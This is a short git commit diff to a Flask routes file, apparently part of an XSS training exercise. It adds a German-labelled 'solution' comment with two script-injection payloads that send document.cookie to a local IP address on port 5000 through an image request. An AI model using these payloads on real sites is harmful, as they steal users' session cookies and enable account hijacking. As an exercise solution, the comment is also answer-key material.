83d85d1422d5e3b9c8fbb3298901924c5261c1ec
Hepha1stos <moritz.brunner@gmx.de>
2025-04-15 19:10:11 +0200

    updated Xss

--- src/main_routes.py
+++ src/main_routes.py
@@ -18,4 +18,6 @@ def homepage():
     return render_template('home.html', cookie=cookie, name=name)
 
 
-
+# Lösung XSS:
+ # 1: <script>var i = new Image(0, 0); i.src=`http://192.168.0.7:5000/?cookie=${document.cookie}`; document.body.appendChild(i);</script>
+ # 2: <script>new Image().src="http://192.168.0.7:5000/?c="+escape(document.cookie)</script>
